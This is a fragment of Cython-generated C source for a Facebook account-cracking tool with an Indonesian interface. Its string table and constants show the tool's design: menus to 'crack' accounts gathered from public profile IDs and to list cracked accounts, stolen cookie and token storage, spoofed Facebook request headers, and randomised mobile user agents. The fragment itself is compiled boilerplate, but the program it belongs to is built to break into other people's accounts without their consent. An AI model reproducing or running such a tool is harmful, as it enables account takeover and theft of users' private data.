  {&__pyx_n_s_login_no_pin, __pyx_k_login_no_pin, sizeof(__pyx_k_login_no_pin), 0, 0, 1, 1},
  {&__pyx_kp_u_login_save_device_login_source, __pyx_k_login_save_device_login_source, sizeof(__pyx_k_login_save_device_login_source), 0, 1, 0, 0},
  {&__pyx_n_s_logo, __pyx_k_logo, sizeof(__pyx_k_logo), 0, 0, 1, 1},
  {&__pyx_kp_u_logout_hapus_login, __pyx_k_logout_hapus_login, sizeof(__pyx_k_logout_hapus_login), 0, 1, 0, 0},
  {&__pyx_n_s_loop, __pyx_k_loop, sizeof(__pyx_k_loop), 0, 0, 1, 1},
  {&__pyx_n_s_lower, __pyx_k_lower, sizeof(__pyx_k_lower), 0, 0, 1, 1},
  {&__pyx_n_s_lsd, __pyx_k_lsd, sizeof(__pyx_k_lsd), 0, 0, 1, 1},
  {&__pyx_kp_s_m_facebook_com, __pyx_k_m_facebook_com, sizeof(__pyx_k_m_facebook_com), 0, 0, 1, 0},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_kp_s_masukan_cookie, __pyx_k_masukan_cookie, sizeof(__pyx_k_masukan_cookie), 0, 0, 1, 0},
  {&__pyx_kp_s_masukan_id_atau_username, __pyx_k_masukan_id_atau_username, sizeof(__pyx_k_masukan_id_atau_username), 0, 0, 1, 0},
  {&__pyx_kp_s_masukan_nama_file, __pyx_k_masukan_nama_file, sizeof(__pyx_k_masukan_nama_file), 0, 0, 1, 0},
  {&__pyx_kp_s_masukan_useragent, __pyx_k_masukan_useragent, sizeof(__pyx_k_masukan_useragent), 0, 0, 1, 0},
  {&__pyx_kp_s_max_age_0, __pyx_k_max_age_0, sizeof(__pyx_k_max_age_0), 0, 0, 1, 0},
  {&__pyx_n_s_max_workers, __pyx_k_max_workers, sizeof(__pyx_k_max_workers), 0, 0, 1, 1},
  {&__pyx_n_s_mbasic, __pyx_k_mbasic, sizeof(__pyx_k_mbasic), 0, 0, 1, 1},
  {&__pyx_kp_s_mbasic_facebook_com, __pyx_k_mbasic_facebook_com, sizeof(__pyx_k_mbasic_facebook_com), 0, 0, 1, 0},
  {&__pyx_n_s_memek, __pyx_k_memek, sizeof(__pyx_k_memek), 0, 0, 1, 1},
  {&__pyx_n_s_menu, __pyx_k_menu, sizeof(__pyx_k_menu), 0, 0, 1, 1},
  {&__pyx_n_s_message, __pyx_k_message, sizeof(__pyx_k_message), 0, 0, 1, 1},
  {&__pyx_n_s_metaclass, __pyx_k_metaclass, sizeof(__pyx_k_metaclass), 0, 0, 1, 1},
  {&__pyx_kp_s_method, __pyx_k_method, sizeof(__pyx_k_method), 0, 0, 1, 0},
  {&__pyx_n_s_method_2, __pyx_k_method_2, sizeof(__pyx_k_method_2), 0, 0, 1, 1},
  {&__pyx_n_s_metode_api, __pyx_k_metode_api, sizeof(__pyx_k_metode_api), 0, 0, 1, 1},
  {&__pyx_n_s_metode_validate, __pyx_k_metode_validate, sizeof(__pyx_k_metode_validate), 0, 0, 1, 1},
  {&__pyx_n_s_mob, __pyx_k_mob, sizeof(__pyx_k_mob), 0, 0, 1, 1},
  {&__pyx_n_s_mobile, __pyx_k_mobile, sizeof(__pyx_k_mobile), 0, 0, 1, 1},
  {&__pyx_n_s_model_device, __pyx_k_model_device, sizeof(__pyx_k_model_device), 0, 0, 1, 1},
  {&__pyx_n_s_module, __pyx_k_module, sizeof(__pyx_k_module), 0, 0, 1, 1},
  {&__pyx_n_s_mtd, __pyx_k_mtd, sizeof(__pyx_k_mtd), 0, 0, 1, 1},
  {&__pyx_n_s_myua, __pyx_k_myua, sizeof(__pyx_k_myua), 0, 0, 1, 1},
  {&__pyx_n_s_nama, __pyx_k_nama, sizeof(__pyx_k_nama), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_name_2, __pyx_k_name_2, sizeof(__pyx_k_name_2), 0, 0, 1, 1},
  {&__pyx_kp_u_name_friends_fields_id_name_birt, __pyx_k_name_friends_fields_id_name_birt, sizeof(__pyx_k_name_friends_fields_id_name_birt), 0, 1, 0, 0},
  {&__pyx_kp_u_name_friends_fields_id_name_birt_2, __pyx_k_name_friends_fields_id_name_birt_2, sizeof(__pyx_k_name_friends_fields_id_name_birt_2), 0, 1, 0, 0},
  {&__pyx_kp_s_name_jazoest_value, __pyx_k_name_jazoest_value, sizeof(__pyx_k_name_jazoest_value), 0, 0, 1, 0},
  {&__pyx_kp_s_name_lsd_value, __pyx_k_name_lsd_value, sizeof(__pyx_k_name_lsd_value), 0, 0, 1, 0},
  {&__pyx_kp_u_nav_source_no_referrer, __pyx_k_nav_source_no_referrer, sizeof(__pyx_k_nav_source_no_referrer), 0, 1, 0, 0},
  {&__pyx_n_s_next, __pyx_k_next, sizeof(__pyx_k_next), 0, 0, 1, 1},
  {&__pyx_n_s_now, __pyx_k_now, sizeof(__pyx_k_now), 0, 0, 1, 1},
  {&__pyx_n_s_num, __pyx_k_num, sizeof(__pyx_k_num), 0, 0, 1, 1},
  {&__pyx_n_s_ok, __pyx_k_ok, sizeof(__pyx_k_ok), 0, 0, 1, 1},
  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
  {&__pyx_n_s_origin, __pyx_k_origin, sizeof(__pyx_k_origin), 0, 0, 1, 1},
  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
  {&__pyx_n_s_paging, __pyx_k_paging, sizeof(__pyx_k_paging), 0, 0, 1, 1},
  {&__pyx_n_s_params, __pyx_k_params, sizeof(__pyx_k_params), 0, 0, 1, 1},
  {&__pyx_n_s_parser, __pyx_k_parser, sizeof(__pyx_k_parser), 0, 0, 1, 1},
  {&__pyx_n_s_pass, __pyx_k_pass, sizeof(__pyx_k_pass), 0, 0, 1, 1},
  {&__pyx_n_s_password, __pyx_k_password, sizeof(__pyx_k_password), 0, 0, 1, 1},
  {&__pyx_kp_s_pilih_menu, __pyx_k_pilih_menu, sizeof(__pyx_k_pilih_menu), 0, 0, 1, 0},
  {&__pyx_n_s_post, __pyx_k_post, sizeof(__pyx_k_post), 0, 0, 1, 1},
  {&__pyx_n_s_prepare, __pyx_k_prepare, sizeof(__pyx_k_prepare), 0, 0, 1, 1},
  {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},
  {&__pyx_n_s_prox, __pyx_k_prox, sizeof(__pyx_k_prox), 0, 0, 1, 1},
  {&__pyx_n_s_publik, __pyx_k_publik, sizeof(__pyx_k_publik), 0, 0, 1, 1},
  {&__pyx_n_s_pw, __pyx_k_pw, sizeof(__pyx_k_pw), 0, 0, 1, 1},
  {&__pyx_n_s_pwx, __pyx_k_pwx, sizeof(__pyx_k_pwx), 0, 0, 1, 1},
  {&__pyx_n_s_qualname, __pyx_k_qualname, sizeof(__pyx_k_qualname), 0, 0, 1, 1},
  {&__pyx_n_s_query, __pyx_k_query, sizeof(__pyx_k_query), 0, 0, 1, 1},
  {&__pyx_n_s_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 0, 1, 1},
  {&__pyx_n_s_randint, __pyx_k_randint, sizeof(__pyx_k_randint), 0, 0, 1, 1},
  {&__pyx_n_s_random, __pyx_k_random, sizeof(__pyx_k_random), 0, 0, 1, 1},
  {&__pyx_n_s_randrange, __pyx_k_randrange, sizeof(__pyx_k_randrange), 0, 0, 1, 1},
  {&__pyx_n_s_range, __pyx_k_range, sizeof(__pyx_k_range), 0, 0, 1, 1},
  {&__pyx_n_s_re, __pyx_k_re, sizeof(__pyx_k_re), 0, 0, 1, 1},
  {&__pyx_n_s_read, __pyx_k_read, sizeof(__pyx_k_read), 0, 0, 1, 1},
  {&__pyx_n_s_referer, __pyx_k_referer, sizeof(__pyx_k_referer), 0, 0, 1, 1},
  {&__pyx_n_s_regex, __pyx_k_regex, sizeof(__pyx_k_regex), 0, 0, 1, 1},
  {&__pyx_n_s_remove, __pyx_k_remove, sizeof(__pyx_k_remove), 0, 0, 1, 1},
  {&__pyx_n_s_replace, __pyx_k_replace, sizeof(__pyx_k_replace), 0, 0, 1, 1},
  {&__pyx_n_s_requests, __pyx_k_requests, sizeof(__pyx_k_requests), 0, 0, 1, 1},
  {&__pyx_n_s_requests_exceptions, __pyx_k_requests_exceptions, sizeof(__pyx_k_requests_exceptions), 0, 0, 1, 1},
  {&__pyx_n_s_res, __pyx_k_res, sizeof(__pyx_k_res), 0, 0, 1, 1},
  {&__pyx_kp_s_s_s, __pyx_k_s_s, sizeof(__pyx_k_s_s), 0, 0, 1, 0},
  {&__pyx_kp_s_same_origin, __pyx_k_same_origin, sizeof(__pyx_k_same_origin), 0, 0, 1, 0},
  {&__pyx_n_s_sandi, __pyx_k_sandi, sizeof(__pyx_k_sandi), 0, 0, 1, 1},
  {&__pyx_kp_s_sandi_tambahan, __pyx_k_sandi_tambahan, sizeof(__pyx_k_sandi_tambahan), 0, 0, 1, 0},
  {&__pyx_n_s_sdk, __pyx_k_sdk, sizeof(__pyx_k_sdk), 0, 0, 1, 1},
  {&__pyx_n_s_sdk_version, __pyx_k_sdk_version, sizeof(__pyx_k_sdk_version), 0, 0, 1, 1},
  {&__pyx_n_s_search, __pyx_k_search, sizeof(__pyx_k_search), 0, 0, 1, 1},
  {&__pyx_kp_s_sec_ch_ua, __pyx_k_sec_ch_ua, sizeof(__pyx_k_sec_ch_ua), 0, 0, 1, 0},
  {&__pyx_kp_s_sec_ch_ua_mobile, __pyx_k_sec_ch_ua_mobile, sizeof(__pyx_k_sec_ch_ua_mobile), 0, 0, 1, 0},
  {&__pyx_kp_s_sec_ch_ua_platform, __pyx_k_sec_ch_ua_platform, sizeof(__pyx_k_sec_ch_ua_platform), 0, 0, 1, 0},
  {&__pyx_kp_s_sec_fetch_dest, __pyx_k_sec_fetch_dest, sizeof(__pyx_k_sec_fetch_dest), 0, 0, 1, 0},
  {&__pyx_kp_s_sec_fetch_mode, __pyx_k_sec_fetch_mode, sizeof(__pyx_k_sec_fetch_mode), 0, 0, 1, 0},
  {&__pyx_kp_s_sec_fetch_site, __pyx_k_sec_fetch_site, sizeof(__pyx_k_sec_fetch_site), 0, 0, 1, 0},
  {&__pyx_kp_s_sec_fetch_user, __pyx_k_sec_fetch_user, sizeof(__pyx_k_sec_fetch_user), 0, 0, 1, 0},
  {&__pyx_kp_u_sedang_mengumpulkan, __pyx_k_sedang_mengumpulkan, sizeof(__pyx_k_sedang_mengumpulkan), 0, 1, 0, 0},
  {&__pyx_kp_u_selamat_datang, __pyx_k_selamat_datang, sizeof(__pyx_k_selamat_datang), 0, 1, 0, 0},
  {&__pyx_n_s_self, __pyx_k_self, sizeof(__pyx_k_self), 0, 0, 1, 1},
  {&__pyx_n_s_send, __pyx_k_send, sizeof(__pyx_k_send), 0, 0, 1, 1},
  {&__pyx_n_s_ses, __pyx_k_ses, sizeof(__pyx_k_ses), 0, 0, 1, 1},
  {&__pyx_n_s_session_cookies, __pyx_k_session_cookies, sizeof(__pyx_k_session_cookies), 0, 0, 1, 1},
  {&__pyx_n_s_session_key, __pyx_k_session_key, sizeof(__pyx_k_session_key), 0, 0, 1, 1},
  {&__pyx_n_s_set_ugent, __pyx_k_set_ugent, sizeof(__pyx_k_set_ugent), 0, 0, 1, 1},
  {&__pyx_n_s_shell, __pyx_k_shell, sizeof(__pyx_k_shell), 0, 0, 1, 1},
  {&__pyx_n_s_sig, __pyx_k_sig, sizeof(__pyx_k_sig), 0, 0, 1, 1},
  {&__pyx_n_s_simpan_hasil, __pyx_k_simpan_hasil, sizeof(__pyx_k_simpan_hasil), 0, 0, 1, 1},
  {&__pyx_n_s_sleep, __pyx_k_sleep, sizeof(__pyx_k_sleep), 0, 0, 1, 1},
  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},
  {&__pyx_n_s_splitlines, __pyx_k_splitlines, sizeof(__pyx_k_splitlines), 0, 0, 1, 1},
  {&__pyx_n_s_stdout, __pyx_k_stdout, sizeof(__pyx_k_stdout), 0, 0, 1, 1},
  {&__pyx_n_s_strftime, __pyx_k_strftime, sizeof(__pyx_k_strftime), 0, 0, 1, 1},
  {&__pyx_n_s_sub, __pyx_k_sub, sizeof(__pyx_k_sub), 0, 0, 1, 1},
  {&__pyx_n_s_submit, __pyx_k_submit, sizeof(__pyx_k_submit), 0, 0, 1, 1},
  {&__pyx_n_s_subprocess, __pyx_k_subprocess, sizeof(__pyx_k_subprocess), 0, 0, 1, 1},
  {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},
  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},
  {&__pyx_n_s_tampung, __pyx_k_tampung, sizeof(__pyx_k_tampung), 0, 0, 1, 1},
  {&__pyx_kp_u_tanggal, __pyx_k_tanggal, sizeof(__pyx_k_tanggal), 0, 1, 0, 0},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_s_text, __pyx_k_text, sizeof(__pyx_k_text), 0, 0, 1, 1},
  {&__pyx_kp_s_text_html_application_xhtml_xml, __pyx_k_text_html_application_xhtml_xml, sizeof(__pyx_k_text_html_application_xhtml_xml), 0, 0, 1, 0},
  {&__pyx_n_s_throw, __pyx_k_throw, sizeof(__pyx_k_throw), 0, 0, 1, 1},
  {&__pyx_n_s_time, __pyx_k_time, sizeof(__pyx_k_time), 0, 0, 1, 1},
  {&__pyx_kp_u_token, __pyx_k_token, sizeof(__pyx_k_token), 0, 1, 0, 0},
  {&__pyx_n_s_token_2, __pyx_k_token_2, sizeof(__pyx_k_token_2), 0, 0, 1, 1},
  {&__pyx_kp_s_token_txt, __pyx_k_token_txt, sizeof(__pyx_k_token_txt), 0, 0, 1, 0},
  {&__pyx_kp_u_total, __pyx_k_total, sizeof(__pyx_k_total), 0, 1, 0, 0},
  {&__pyx_kp_u_total_id, __pyx_k_total_id, sizeof(__pyx_k_total_id), 0, 1, 0, 0},
  {&__pyx_kp_s_txt, __pyx_k_txt, sizeof(__pyx_k_txt), 0, 0, 1, 0},
  {&__pyx_n_s_ua, __pyx_k_ua, sizeof(__pyx_k_ua), 0, 0, 1, 1},
  {&__pyx_n_s_ugen2, __pyx_k_ugen2, sizeof(__pyx_k_ugen2), 0, 0, 1, 1},
  {&__pyx_n_s_ugent, __pyx_k_ugent, sizeof(__pyx_k_ugent), 0, 0, 1, 1},
  {&__pyx_n_s_uid, __pyx_k_uid, sizeof(__pyx_k_uid), 0, 0, 1, 1},
  {&__pyx_n_s_update, __pyx_k_update, sizeof(__pyx_k_update), 0, 0, 1, 1},
  {&__pyx_kp_s_upgrade_insecure_requests, __pyx_k_upgrade_insecure_requests, sizeof(__pyx_k_upgrade_insecure_requests), 0, 0, 1, 0},
  {&__pyx_n_s_url, __pyx_k_url, sizeof(__pyx_k_url), 0, 0, 1, 1},
  {&__pyx_n_s_urutan, __pyx_k_urutan, sizeof(__pyx_k_urutan), 0, 0, 1, 1},
  {&__pyx_n_s_user, __pyx_k_user, sizeof(__pyx_k_user), 0, 0, 1, 1},
  {&__pyx_kp_s_user_agent, __pyx_k_user_agent, sizeof(__pyx_k_user_agent), 0, 0, 1, 0},
  {&__pyx_kp_u_useragent_dan_di_simpan_ke, __pyx_k_useragent_dan_di_simpan_ke, sizeof(__pyx_k_useragent_dan_di_simpan_ke), 0, 1, 0, 0},
  {&__pyx_n_s_usragent, __pyx_k_usragent, sizeof(__pyx_k_usragent), 0, 0, 1, 1},
  {&__pyx_kp_s_utf_8, __pyx_k_utf_8, sizeof(__pyx_k_utf_8), 0, 0, 1, 0},
  {&__pyx_n_s_value, __pyx_k_value, sizeof(__pyx_k_value), 0, 0, 1, 1},
  {&__pyx_n_s_verchrome, __pyx_k_verchrome, sizeof(__pyx_k_verchrome), 0, 0, 1, 1},
  {&__pyx_n_s_versi, __pyx_k_versi, sizeof(__pyx_k_versi), 0, 0, 1, 1},
  {&__pyx_n_s_versi_android, __pyx_k_versi_android, sizeof(__pyx_k_versi_android), 0, 0, 1, 1},
  {&__pyx_n_s_versi_chrome, __pyx_k_versi_chrome, sizeof(__pyx_k_versi_chrome), 0, 0, 1, 1},
  {&__pyx_n_s_versi_iphone, __pyx_k_versi_iphone, sizeof(__pyx_k_versi_iphone), 0, 0, 1, 1},
  {&__pyx_n_s_w, __pyx_k_w, sizeof(__pyx_k_w), 0, 0, 1, 1},
  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
  {&__pyx_n_s_x, __pyx_k_x, sizeof(__pyx_k_x), 0, 0, 1, 1},
  {&__pyx_kp_s_x_fb_connection_bandwidth, __pyx_k_x_fb_connection_bandwidth, sizeof(__pyx_k_x_fb_connection_bandwidth), 0, 0, 1, 0},
  {&__pyx_kp_s_x_fb_connection_quality, __pyx_k_x_fb_connection_quality, sizeof(__pyx_k_x_fb_connection_quality), 0, 0, 1, 0},
  {&__pyx_kp_s_x_fb_http_engine, __pyx_k_x_fb_http_engine, sizeof(__pyx_k_x_fb_http_engine), 0, 0, 1, 0},
  {&__pyx_kp_s_x_fb_lsd, __pyx_k_x_fb_lsd, sizeof(__pyx_k_x_fb_lsd), 0, 0, 1, 0},
  {&__pyx_kp_s_x_fb_net_hni, __pyx_k_x_fb_net_hni, sizeof(__pyx_k_x_fb_net_hni), 0, 0, 1, 0},
  {&__pyx_kp_s_x_fb_sim_hni, __pyx_k_x_fb_sim_hni, sizeof(__pyx_k_x_fb_sim_hni), 0, 0, 1, 0},
  {&__pyx_kp_s_x_requested_with, __pyx_k_x_requested_with, sizeof(__pyx_k_x_requested_with), 0, 0, 1, 0},
  {&__pyx_n_s_xx, __pyx_k_xx, sizeof(__pyx_k_xx), 0, 0, 1, 1},
  {&__pyx_n_s_y, __pyx_k_y, sizeof(__pyx_k_y), 0, 0, 1, 1},
  {&__pyx_n_s_z, __pyx_k_z, sizeof(__pyx_k_z), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_range = __Pyx_GetBuiltinName(__pyx_n_s_range); if (!__pyx_builtin_range) __PYX_ERR(0, 19, __pyx_L1_error)
  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 47, __pyx_L1_error)
  __pyx_builtin_input = __Pyx_GetBuiltinName(__pyx_n_s_input); if (!__pyx_builtin_input) __PYX_ERR(0, 64, __pyx_L1_error)
  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 70, __pyx_L1_error)
  __pyx_builtin_exit = __Pyx_GetBuiltinName(__pyx_n_s_exit); if (!__pyx_builtin_exit) __PYX_ERR(0, 80, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple__3 = PyTuple_Pack(1, __pyx_kp_s_Github_https_github_com_Fall_Xa); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__3);
  __Pyx_GIVEREF(__pyx_tuple__3);

  
  __pyx_tuple__5 = PyTuple_Pack(1, __pyx_kp_s__4); if (unlikely(!__pyx_tuple__5)) __PYX_ERR(0, 59, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__5);
  __Pyx_GIVEREF(__pyx_tuple__5);

  
  __pyx_tuple__6 = PyTuple_Pack(1, __pyx_kp_s_masukan_cookie); if (unlikely(!__pyx_tuple__6)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__6);
  __Pyx_GIVEREF(__pyx_tuple__6);

  
  __pyx_tuple__7 = PyTuple_Pack(1, __pyx_kp_s_https_www_facebook_com_adsmanage); if (unlikely(!__pyx_tuple__7)) __PYX_ERR(0, 66, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__7);
  __Pyx_GIVEREF(__pyx_tuple__7);

  
  __pyx_tuple__8 = PyTuple_Pack(2, __pyx_kp_s_data_cookie_txt, __pyx_n_s_w); if (unlikely(!__pyx_tuple__8)) __PYX_ERR(0, 70, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__8);
  __Pyx_GIVEREF(__pyx_tuple__8);

  
  __pyx_tuple__9 = PyTuple_Pack(2, __pyx_kp_s_data_token_txt, __pyx_n_s_w); if (unlikely(!__pyx_tuple__9)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__9);
  __Pyx_GIVEREF(__pyx_tuple__9);

  
  __pyx_tuple__10 = PyTuple_Pack(1, __pyx_kp_s_cookie_invalid); if (unlikely(!__pyx_tuple__10)) __PYX_ERR(0, 80, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__10);
  __Pyx_GIVEREF(__pyx_tuple__10);

  
  __pyx_tuple__11 = PyTuple_Pack(2, __pyx_kp_s_data_token_txt, __pyx_n_s_r); if (unlikely(!__pyx_tuple__11)) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__11);
  __Pyx_GIVEREF(__pyx_tuple__11);

  
  __pyx_tuple__12 = PyTuple_Pack(2, __pyx_kp_s_data_cookie_txt, __pyx_n_s_r); if (unlikely(!__pyx_tuple__12)) __PYX_ERR(0, 85, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__12);
  __Pyx_GIVEREF(__pyx_tuple__12);

  
  __pyx_tuple__14 = PyTuple_Pack(1, __pyx_kp_s_01_crack_dari_id_publik); if (unlikely(!__pyx_tuple__14)) __PYX_ERR(0, 103, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__14);
  __Pyx_GIVEREF(__pyx_tuple__14);

  
  __pyx_tuple__15 = PyTuple_Pack(1, __pyx_kp_s_02_setting_useragent); if (unlikely(!__pyx_tuple__15)) __PYX_ERR(0, 104, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__15);
  __Pyx_GIVEREF(__pyx_tuple__15);

  
  __pyx_tuple__16 = PyTuple_Pack(1, __pyx_kp_s_03_lihat_akun_hasil_crack); if (unlikely(!__pyx_tuple__16)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__16);
  __Pyx_GIVEREF(__pyx_tuple__16);

  
  __pyx_tuple__18 = PyTuple_Pack(1, __pyx_kp_s_pilih_menu); if (unlikely(!__pyx_tuple__18)) __PYX_ERR(0, 107, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__18);
  __Pyx_GIVEREF(__pyx_tuple__18);

  
  __pyx_tuple__19 = PyTuple_Pack(1, __pyx_kp_s_isi_me_jika_ingin_crack_dari_da); if (unlikely(!__pyx_tuple__19)) __PYX_ERR(0, 109, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__19);
  __Pyx_GIVEREF(__pyx_tuple__19);

  
  __pyx_tuple__20 = PyTuple_Pack(1, __pyx_kp_s_masukan_id_atau_username); if (unlikely(!__pyx_tuple__20)) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__20);
  __Pyx_GIVEREF(__pyx_tuple__20);

  
  __pyx_tuple__22 = PyTuple_Pack(1, __pyx_kp_s_berhasil_menghapus_login); if (unlikely(!__pyx_tuple__22)) __PYX_ERR(0, 122, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__22);
  __Pyx_GIVEREF(__pyx_tuple__22);

  
  __pyx_tuple__26 = PyTuple_Pack(1, __pyx_kp_s_ketik_myua_jika_ingin_ua_hp_sen); if (unlikely(!__pyx_tuple__26)) __PYX_ERR(0, 140, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__26);
  __Pyx_GIVEREF(__pyx_tuple__26);

  
  __pyx_tuple__27 = PyTuple_Pack(1, __pyx_kp_s_masukan_useragent); if (unlikely(!__pyx_tuple__27)) __PYX_ERR(0, 141, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__27);
  __Pyx_GIVEREF(__pyx_tuple__27);

  
  __pyx_tuple__28 = PyTuple_Pack(1, __pyx_kp_s_berhasil_mengembalikan_useragen); if (unlikely(!__pyx_tuple__28)) __PYX_ERR(0, 145, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__28);
  __Pyx_GIVEREF(__pyx_tuple__28);

  
  __pyx_tuple__29 = PyTuple_Pack(2, __pyx_kp_s_data_ugent, __pyx_n_s_w); if (unlikely(!__pyx_tuple__29)) __PYX_ERR(0, 147, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__29);
  __Pyx_GIVEREF(__pyx_tuple__29);

  
  __pyx_tuple__30 = PyTuple_Pack(2, __pyx_int_90, __pyx_int_110); if (unlikely(!__pyx_tuple__30)) __PYX_ERR(0, 150, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__30);
  __Pyx_GIVEREF(__pyx_tuple__30);
  __pyx_tuple__31 = PyTuple_Pack(2, __pyx_int_4000, __pyx_int_4900); if (unlikely(!__pyx_tuple__31)) __PYX_ERR(0, 150, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__31);
  __Pyx_GIVEREF(__pyx_tuple__31);
  __pyx_tuple__33 = PyTuple_Pack(2, __pyx_int_40, __pyx_int_150); if (unlikely(!__pyx_tuple__33)) __PYX_ERR(0, 150, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__33);
  __Pyx_GIVEREF(__pyx_tuple__33);

  
  __pyx_tuple__34 = PyTuple_Pack(2, __pyx_int_4, __pyx_int_12); if (unlikely(!__pyx_tuple__34)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__34);
  __Pyx_GIVEREF(__pyx_tuple__34);

  
  __pyx_tuple__35 = PyTuple_Pack(2, __pyx_int_10, __pyx_int_15); if (unlikely(!__pyx_tuple__35)) __PYX_ERR(0, 160, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__35);
  __Pyx_GIVEREF(__pyx_tuple__35);
  __pyx_tuple__37 = PyTuple_Pack(2, __pyx_int_0, __pyx_int_3); if (unlikely(!__pyx_tuple__37)) __PYX_ERR(0, 160, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__37);
  __Pyx_GIVEREF(__pyx_tuple__37);

  
  __pyx_tuple__38 = PyTuple_Pack(1, __pyx_kp_s_getprop_ro_product_model); if (unlikely(!__pyx_tuple__38)) __PYX_ERR(0, 168, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__38);
  __Pyx_GIVEREF(__pyx_tuple__38);
  __pyx_tuple__40 = PyTuple_Pack(2, __pyx_kp_s__39, __pyx_kp_s__21); if (unlikely(!__pyx_tuple__40)) __PYX_ERR(0, 168, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__40);
  __Pyx_GIVEREF(__pyx_tuple__40);

  
  __pyx_tuple__41 = PyTuple_Pack(1, __pyx_kp_s_getprop_ro_build_id); if (unlikely(!__pyx_tuple__41)) __PYX_ERR(0, 169, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__41);
  __Pyx_GIVEREF(__pyx_tuple__41);

  
  __pyx_tuple__43 = PyTuple_Pack(2, __pyx_int_100, __pyx_int_108); if (unlikely(!__pyx_tuple__43)) __PYX_ERR(0, 170, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__43);
  __Pyx_GIVEREF(__pyx_tuple__43);

  
  __pyx_tuple__44 = PyTuple_Pack(1, __pyx_kp_s_01_cek_akun_hasil_crack_OK); if (unlikely(!__pyx_tuple__44)) __PYX_ERR(0, 177, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__44);
  __Pyx_GIVEREF(__pyx_tuple__44);

  
  __pyx_tuple__45 = PyTuple_Pack(1, __pyx_kp_s_02_cek_akun_hasil_crack_CP); if (unlikely(!__pyx_tuple__45)) __PYX_ERR(0, 178, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__45);
  __Pyx_GIVEREF(__pyx_tuple__45);

  
  __pyx_tuple__47 = PyTuple_Pack(1, __pyx_kp_s_masukan_nama_file); if (unlikely(!__pyx_tuple__47)) __PYX_ERR(0, 189, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__47);
  __Pyx_GIVEREF(__pyx_tuple__47);

  
  __pyx_tuple__49 = PyTuple_Pack(1, __pyx_kp_s_file_tidak_ada); if (unlikely(!__pyx_tuple__49)) __PYX_ERR(0, 193, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__49);
  __Pyx_GIVEREF(__pyx_tuple__49);

  
  __pyx_tuple__50 = PyTuple_Pack(1, __pyx_kp_s_berhasil_mengecek_total_len_fil); if (unlikely(!__pyx_tuple__50)) __PYX_ERR(0, 197, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__50);
  __Pyx_GIVEREF(__pyx_tuple__50);

  
  __pyx_tuple__51 = PyTuple_Pack(1, __pyx_kp_s_1_method_API_fast); if (unlikely(!__pyx_tuple__51)) __PYX_ERR(0, 212, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__51);
  __Pyx_GIVEREF(__pyx_tuple__51);

  
